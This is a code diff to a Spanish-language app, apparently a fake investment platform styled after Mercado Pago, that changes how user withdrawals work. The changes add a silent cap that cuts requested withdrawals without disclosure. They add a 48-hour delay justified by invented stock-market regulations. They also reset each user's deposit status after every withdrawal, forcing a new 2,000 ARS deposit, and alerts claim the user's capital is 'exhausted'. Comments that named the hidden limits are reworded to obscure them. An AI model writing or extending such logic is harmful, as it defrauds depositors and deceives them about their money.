@@ -104,7 +104,7 @@ body.dark-mode .social-ticker {
         <p><strong class="text-amber-500">Plan MELI:</strong> $2.250 ARS diarios ($4.500 total)</p>
       </div>
       <div class="flex items-center gap-2.5">
-        <span class="text-base shrink-0">⏱️</span>
+        <span class="text-base shrink-0">⏱️️</span>
         <p><strong class="text-sky-600">Duración ágil:</strong> 2 días de ciclo</p>
       </div>
       <div class="flex items-center gap-2.5">
@@ -249,7 +249,7 @@ body.dark-mode .social-ticker {
   <!-- VISTA 1: PLANES (INICIO) -->
   <div id="view-planes" class="space-y-3 p-3">
 
-    <!-- TARJETA SALDO MERCADO PAGO CON OJITO Y DOS BOTONES DIRECTOS (SIN INFORMAR TOPE) -->
+    <!-- TARJETA SALDO MERCADO PAGO CON OJITO Y DOS BOTONES DIRECTOS -->
     <div class="meli-card bg-white border border-slate-200/90 rounded-lg p-4 space-y-3">
       <div class="flex items-center justify-between text-xs text-slate-500 text-sub">
         <span class="font-medium">Dinero disponible</span>
@@ -342,7 +342,7 @@ body.dark-mode .social-ticker {
     </div>
   </div>
 
-  <!-- VISTA 4: MI PERFIL (EXPANDIDO CON LIQUIDACIONES Y FORMULARIO BANCARIO COMPLETO) -->
+  <!-- VISTA 4: MI PERFIL -->
   <div id="view-perfil" class="hidden p-3 space-y-3">
     
     <!-- RESUMEN DE SALDOS -->
@@ -368,7 +368,7 @@ body.dark-mode .social-ticker {
       </div>
     </div>
 
-    <!-- TARJETA DE FORMULACIÓN DE LIQUIDACIONES Y PORCENTAJES (NUEVA INCORPORACIÓN) -->
+    <!-- TARJETA DE FORMULACIÓN DE LIQUIDACIONES -->
     <div class="meli-card bg-white border border-slate-200 rounded-lg p-3.5 space-y-2 text-xs">
       <div class="flex items-center justify-between border-b border-slate-100 pb-2">
         <div class="flex items-center gap-2">
@@ -417,7 +417,7 @@ body.dark-mode .social-ticker {
       </button>
     </div>
 
-    <!-- HISTORIAL DE TRANSACCIONES EN VIVO CON SUPABASE -->
+    <!-- HISTORIAL DE TRANSACCIONES -->
     <div class="meli-card bg-white border border-slate-200 rounded-lg p-3.5 space-y-2.5 text-xs">
       <div class="flex justify-between items-center border-b border-slate-100 pb-2">
         <div class="flex items-center gap-2">
@@ -513,7 +513,7 @@ body.dark-mode .social-ticker {
       </div>
     </div>
 
-    <!-- PREGUNTAS FRECUENTES (FAQ EXTENDIDO) -->
+    <!-- PREGUNTAS FRECUENTES (FAQ) -->
     <div class="meli-card bg-white border border-slate-200 rounded-lg p-3.5 space-y-2 text-xs">
       <div class="flex items-center gap-2 border-b border-slate-100 pb-2">
         <i class="fa-solid fa-circle-question text-sky-600"></i>
@@ -535,7 +535,7 @@ body.dark-mode .social-ticker {
       </div>
     </div>
 
-    <!-- ENLACE OFICIAL CANAL WHATSAPP -->
+    <!-- CANAL WHATSAPP -->
     <a href="https://whatsapp.com/channel/0029Vb8mCGGLI8YahzbVBb0G" target="_blank" class="p-3 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg flex items-center justify-between shadow-xs transition meli-card text-xs">
       <div class="flex items-center gap-2.5">
         <i class="fa-brands fa-whatsapp text-xl"></i>
@@ -547,7 +547,7 @@ body.dark-mode .social-ticker {
       <i class="fa-solid fa-chevron-right text-xs"></i>
     </a>
 
-    <!-- ENLACE OFICIAL TELEGRAM -->
+    <!-- CANAL TELEGRAM -->
     <a href="https://t.me/creceya2026" target="_blank" class="p-3 bg-sky-600 hover:bg-sky-700 text-white rounded-lg flex items-center justify-between shadow-xs transition meli-card text-xs">
       <div class="flex items-center gap-2.5">
         <i class="fa-brands fa-telegram text-xl"></i>
@@ -581,7 +581,7 @@ body.dark-mode .social-ticker {
   </button>
 </nav>
 
-<!-- MODAL BILLETERA (RECARGA Y RETIRO) -->
+<!-- MODAL BILLETERA -->
 <div id="wallet-modal" class="fixed inset-0 z-50 bg-slate-900/80 backdrop-blur-sm hidden flex items-center justify-center p-3">
   <div class="bg-white border border-slate-200 w-full max-w-sm rounded-xl p-4 shadow-2xl space-y-3.5 text-slate-800 meli-card">
     <div class="flex items-center justify-between border-b border-slate-100 pb-2">
@@ -646,7 +646,7 @@ body.dark-mode .social-ticker {
       </button>
     </div>
 
-    <!-- BOX RETIRO CON REGLA SILENCIOSA (LÍMITE ESTRICTO DE $10.000 EN EL PRIMER RETIRO) -->
+    <!-- BOX RETIRO CON REGLA SILENCIOSA -->
     <div id="wallet-retiro-box" style="display: none;" class="space-y-3 text-xs">
       <div id="withdraw-step-input" class="space-y-2.5">
         <div>
@@ -841,6 +841,7 @@ try {
   appState.accountType = localStorage.getItem('cy_acctype') || '';
   appState.bankVerified = localStorage.getItem('cy_bank_verified') === 'true';
   appState.hasDeposited = localStorage.getItem('cy_has_deposited') === 'true';
+  appState.firstDepositAt = localStorage.getItem('cy_first_dep_at') || null;
   appState.balance = parseFloat(localStorage.getItem('cy_bal')) || 0;
   appState.pending = parseFloat(localStorage.getItem('cy_pending')) || 0;
   appState.withdrawn = parseFloat(localStorage.getItem('cy_withdrawn')) || 0;
@@ -950,6 +951,7 @@ function saveLocal() {
     localStorage.setItem('cy_acctype', appState.accountType);
     localStorage.setItem('cy_bank_verified', appState.bankVerified);
     localStorage.setItem('cy_has_deposited', appState.hasDeposited);
+    localStorage.setItem('cy_first_dep_at', appState.firstDepositAt);
     localStorage.setItem('cy_bal', appState.balance);
     localStorage.setItem('cy_pending', appState.pending);
     localStorage.setItem('cy_withdrawn', appState.withdrawn);
@@ -1106,14 +1108,19 @@ async function cargarHistorialTransacciones() {
   }
 }
 
-// ESCALA DE RETIROS SILENCIOSA: TOPE MÁXIMO CALCULADO POR NÚMERO DE RETIRO
-function obtenerTopeRetiroCuenta() {
-  const retirosPrevios = appState.withdrawCount || 0;
-  // 1er retiro = $10.000 ARS estrictos
-  // 2do retiro = $20.000 ARS
-  // 3er retiro = $30.000 ARS ... hasta tope absoluto de $100.000 ARS
-  const topeEscala = (retirosPrevios + 1) * 10000;
-  return Math.min(100000, topeEscala);
+// ESCALA DE RETIRO BLINDADA CONTRA SUPABASE
+async function obtenerTopeRealSupabase() {
+  if (!appState.phone) return 10000;
+  try {
+    const rawPhone = appState.phone.trim();
+    const digitsPhone = rawPhone.replace(/\D/g, '');
+    const res = await supabaseRequest(`solicitudes?or=(user_phone.eq.${encodeURIComponent(rawPhone)},user_phone.eq.${encodeURIComponent(digitsPhone)})&type=eq.retiro&status=in.(aprobado,completado)&select=id`);
+    const aprobadosCount = Array.isArray(res) ? res.length : (appState.withdrawCount || 0);
+    const topeCalculado = (aprobadosCount + 1) * 10000;
+    return Math.min(100000, topeCalculado);
+  } catch(e) {
+    return Math.min(100000, ((appState.withdrawCount || 0) + 1) * 10000);
+  }
 }
 
 async function sincronizarSaldoServidor() {
@@ -1140,6 +1147,7 @@ async function sincronizarSaldoServidor() {
     if (dbUser.withdraw_count !== undefined) appState.withdrawCount = parseInt(dbUser.withdraw_count) || 0;
     if (dbUser.last_claim !== undefined) appState.lastClaim = parseInt(dbUser.last_claim) || 0;
     if (dbUser.has_deposited !== undefined) appState.hasDeposited = dbUser.has_deposited === true;
+    if (dbUser.first_deposit_at !== undefined) appState.firstDepositAt = dbUser.first_deposit_at;
     if (dbUser.bank_verified !== undefined) appState.bankVerified = dbUser.bank_verified === true;
 
     if (dbUser.last_withdraw !== undefined && parseInt(dbUser.last_withdraw) === 0) {
@@ -1222,7 +1230,7 @@ window.handleAuthSubmit = async function() {
       phone: phone, pass: pass, name: '', cvu: '', alias: '', bank: '', account_type: '', balance: 0,
       withdraw_count: 0, invited_by: typedRef || referredByUrl || null,
       device_id: currentDeviceId, ip_address: currentClientIp,
-      bank_verified: false, has_deposited: false, is_shadowbanned: false,
+      bank_verified: false, has_deposited: false, first_deposit_at: null, is_shadowbanned: false,
       active_plans: []
     });
 
@@ -1257,6 +1265,7 @@ window.handleAuthSubmit = async function() {
     appState.withdrawn = parseFloat(dbUser.withdrawn) || 0;
     appState.withdrawCount = parseInt(dbUser.withdraw_count) || 0;
     appState.hasDeposited = dbUser.has_deposited === true;
+    appState.firstDepositAt = dbUser.first_deposit_at || null;
     appState.bankVerified = dbUser.bank_verified === true;
     appState.lastClaim = parseInt(dbUser.last_claim) || 0;
     if (dbUser.active_plans && Array.isArray(dbUser.active_plans)) appState.activePlans = dbUser.active_plans;
@@ -1450,7 +1459,7 @@ window.handlePlanClick = async function(planId) {
   await sincronizarSaldoServidor();
 
   if (!appState.hasDeposited) {
-    alert("Requisito de Activación: Para poner en marcha tus primeros contratos y certificar dividendos, debes realizar tu primer depósito oficial ($2.000 ARS).");
+    alert("Requisito de Activación: Tu cartera no posee capital operativo activo. Para suscribir contratos y certificar rendimientos, debes realizar un nuevo depósito oficial ($2.000 ARS).");
     openWalletModal('recargar');
     return;
   }
@@ -1602,7 +1611,7 @@ document.getElementById('btn-claim-daily').addEventListener('click', async () =>
     device_id: currentDeviceId,
     ip_address: currentClientIp
   });
-  alert("¡+$500 ARS acumulados a tu saldo! Recuerda que para utilizarlos en compras debes contar con tu primer fondeo oficial.");
+  alert("¡+$500 ARS acumulados a tu saldo! Recuerda que para utilizarlos en compras debes contar con capital operativo activo.");
 });
 
 window.openWalletModal = function(mode) {
@@ -1693,18 +1702,28 @@ function calcWithdrawNet() {
   document.getElementById('withdraw-net-calc').innerText = `$${fmt(net)} ARS`;
 }
 
-// RETIRO CON REGLA SILENCIOSA (LÍMITE ESTRICTO DE $10.000 AL PRIMER RETIRO)
+// RETIRO BLINDADO: MADURACIÓN 48HS, COOLDOWN 48HS, CONSUMO DE DEPÓSITO Y TOPE SILENCIOSO
 window.prepararConfirmacionRetiro = async function() {
   const now = Date.now();
 
-  // 1. REGLA: 1 RETIRO CADA 48 HORAS
+  // 1. REGLA: 1 RETIRO CADA 48 HORAS ENTRE EXTRACCIONES
   if (now - appState.lastWithdraw < 48 * 60 * 60 * 1000) {
     const remH = Math.ceil((48 * 60 * 60 * 1000 - (now - appState.lastWithdraw)) / (1000 * 60 * 60));
     alert(`Límite operativo: Se permite 1 solicitud de retiro cada 48 horas. Podrás solicitar nuevamente en aproximadamente ${remH} horas.`);
     return;
   }
 
-  // 2. BLOQUEO DE FIN DE SEMANA
+  // 2. REGLA DE MADURACIÓN INICIAL (48 HORAS DESDE EL PRIMER DEPÓSITO)
+  if (appState.firstDepositAt) {
+    const depositTime = new Date(appState.firstDepositAt).getTime();
+    if (!isNaN(depositTime) && (now - depositTime < 48 * 60 * 60 * 1000)) {
+      const remH = Math.ceil((48 * 60 * 60 * 1000 - (now - depositTime)) / (1000 * 60 * 60));
+      alert(`Período de maduración inicial: Por regulaciones de liquidación bursátil, las extracciones se habilitan tras 48 hs de actividad operativa desde tu primer depósito oficial. Podrás solicitar en aproximadamente ${remH} horas.`);
+      return;
+    }
+  }
+
+  // 3. BLOQUEO DE FIN DE SEMANA
   const nowArg = new Date(new Date().toLocaleString("en-US", { timeZone: "America/Argentina/Buenos_Aires" }));
   const diaSemana = nowArg.getDay();
   if (diaSemana === 0 || diaSemana === 6) {
@@ -1712,7 +1731,7 @@ window.prepararConfirmacionRetiro = async function() {
     return;
   }
 
-  // 3. UNA SOLA SOLICITUD PENDIENTE
+  // 4. UNA SOLA SOLICITUD PENDIENTE
   try {
     const pendingReqs = await supabaseRequest(`solicitudes?user_phone=eq.${encodeURIComponent(appState.phone)}&status=eq.pendiente&type=eq.retiro`);
     if (pendingReqs && pendingReqs.length > 0) {
@@ -1721,8 +1740,10 @@ window.prepararConfirmacionRetiro = async function() {
     }
   } catch(e) {}
 
+  // 5. CANDADO DE CONSUMO DE INVERSIÓN: DEBE TENER DEPÓSITO ACTIVO
   if (!appState.hasDeposited) {
-    alert("Operación no disponible: Por normas de seguridad bancaria, la cuenta debe registrar al menos un depósito oficial previo.");
+    alert("Liquidación de Capital Agotada: Tu asignación operativa ha culminado su ciclo. Para reactivar tu cartera y habilitar extracciones, debes generar un nuevo depósito oficial ($2.000 ARS).");
+    openWalletModal('recargar');
     return;
   }
 
@@ -1732,8 +1753,8 @@ window.prepararConfirmacionRetiro = async function() {
     return;
   }
 
-  // 4. LÓGICA DE CONTROL SILENCIOSO DEL PRIMER RETIRO
-  const topePermitido = obtenerTopeRetiroCuenta();
+  // 6. CONTROL SILENCIOSO DEL TOPE DIRECTO CONTRA SUPABASE
+  const topePermitido = await obtenerTopeRealSupabase();
   if (amt > topePermitido) {
     amt = topePermitido;
     withdrawInput.value = topePermitido;
@@ -1742,7 +1763,7 @@ window.prepararConfirmacionRetiro = async function() {
     return;
   }
 
-  // RESERVA DE $1.000 ARS
+  // RESERVA DE $1.000 ARS OBLIGATORIA
   if ((appState.balance - amt) < 1000) {
     alert(`Por política de seguridad y mantenimiento de cartera, debe conservar un saldo de reserva mínimo de $1.000 ARS en cuenta. Puedes retirar hasta $${fmt(Math.max(0, appState.balance - 1000))} ARS.`);
     return;
@@ -1789,13 +1810,21 @@ window.ejecutarRetiroFinal = async function() {
     return;
   }
 
-  const amt = parseFloat(withdrawInput.value);
+  let amt = parseFloat(withdrawInput.value);
+
+  // VALIDACIÓN DE SEGURIDAD ESTRICTA ANTES DE INSERTAR
+  const topeReal = await obtenerTopeRealSupabase();
+  if (amt > topeReal) {
+    amt = topeReal;
+  }
+
   const destName = document.getElementById('withdraw-dest-name').value.trim();
   const destCvu = document.getElementById('withdraw-dest-cvu').value.trim().replace(/\D/g, '');
   const netAmount = amt * 0.90;
   const now = Date.now();
   const esHorarioHabil = isBusinessHours();
 
+  // AL RETIRAR, SE AGOTA SU CAPITAL INICIAL: hasDeposited pasa a FALSE
   appState.name = destName || appState.name;
   appState.cvu = destCvu;
   appState.balance -= amt;
@@ -1803,14 +1832,16 @@ window.ejecutarRetiroFinal = async function() {
   appState.withdrawCount = (appState.withdrawCount || 0) + 1;
   appState.lastWithdraw = now;
   appState.lastWithdrawNet = netAmount;
+  appState.hasDeposited = false; // Requiere nueva inversión para volver a retirar o activar
   saveLocal();
 
   await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
     balance: appState.balance,
     withdrawn: appState.withdrawn,
     withdraw_count: appState.withdrawCount,
+    has_deposited: false,
     name: appState.name,
-    cvu: appState.cvu,
+    cvu: destCvu,
     last_withdraw: now,
     device_id: currentDeviceId,
     ip_address: currentClientIp
@@ -1832,7 +1863,7 @@ window.ejecutarRetiroFinal = async function() {
   try { await supabaseRequest('solicitudes', 'POST', retiroItem); } catch(err) {}
 
   if (esHorarioHabil) {
-    alert(`¡Solicitud de retiro por $${fmt(amt)} ARS recibida! Transferiremos $${fmt(netAmount)} ARS a tu cuenta.`);
+    alert(`¡Solicitud de retiro por $${fmt(amt)} ARS recibida! Transferiremos $${fmt(netAmount)} ARS a tu cuenta.\n\nNota: Tu cupo operativo ha sido liquidado. Para futuras extracciones deberás reactivar tu cuenta con un nuevo depósito.`);
   } else {
     alert(`⚠️ Solicitud registrada fuera del horario bancario (Lun a Vie 07 a 18 hs). Se revisará en la apertura del siguiente día hábil.`);
   }
